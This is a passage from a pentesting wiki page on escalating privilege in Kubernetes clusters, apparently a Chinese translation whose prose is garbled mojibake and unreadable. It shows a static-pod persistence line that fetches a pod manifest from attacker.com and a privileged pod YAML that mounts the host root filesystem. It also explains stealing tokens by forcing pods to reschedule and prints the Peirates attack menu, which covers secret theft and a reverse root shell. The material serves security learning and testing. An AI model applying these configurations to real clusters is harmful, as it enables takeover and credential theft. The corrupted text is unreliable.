* åœ¨**kubeletæœåŠ¡**æˆ–**kubeleté…ç½®**ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ä¸­é…ç½®å‚æ•°**`--pod-manifest-path=/etc/kubernetes/manifests`**ï¼Œç„¶åé‡æ–°å¯åŠ¨æœåŠ¡
* åœ¨**`/etc/kubernetes/manifests`**ä¸­çš„**Podå®šä¹‰**ä¸­åˆ›å»ºé…ç½®

**å¦ä¸€ç§æ›´éšè”½çš„æ–¹æ³•æ˜¯ï¼š**

* ä¿®æ”¹**kubelet**é…ç½®æ–‡ä»¶ä¸­çš„å‚æ•°**`staticPodURL`**ï¼Œå¹¶è®¾ç½®ä¸ºç±»ä¼¼`staticPodURL: http://attacker.com:8765/pod.yaml`çš„å†…å®¹ã€‚è¿™å°†ä½¿kubeletè¿›ç¨‹æ ¹æ®æŒ‡å®šçš„URLåˆ›å»ºä¸€ä¸ª**é™æ€Pod**ã€‚

ä»¥ä¸‹æ˜¯ä»[**æ­¤å¤„**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)è·å–çš„åœ¨**kube-system**ä¸­åˆ›å»ºç‰¹æƒPodçš„**Pod**é…ç½®ç¤ºä¾‹ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### åˆ é™¤Pods + ä¸å¯è°ƒåº¦çš„èŠ‚ç‚¹

å¦‚æœæ”»å‡»è€…**å…¥ä¾µäº†ä¸€ä¸ªèŠ‚ç‚¹**ï¼Œä»–å¯ä»¥ä»å…¶ä»–èŠ‚ç‚¹**åˆ é™¤Pods**å¹¶ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•æ‰§è¡ŒPodsï¼Œé‚£ä¹ˆPodså°†åœ¨è¢«å…¥ä¾µçš„èŠ‚ç‚¹ä¸Šé‡æ–°è¿è¡Œï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿ**çªƒå–å…¶ä¸­è¿è¡Œçš„ä»¤ç‰Œ**ã€‚\
æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒæ­¤é“¾æ¥**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„å…¬å¸åœ¨ HackTricks ä¸­è¢«å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
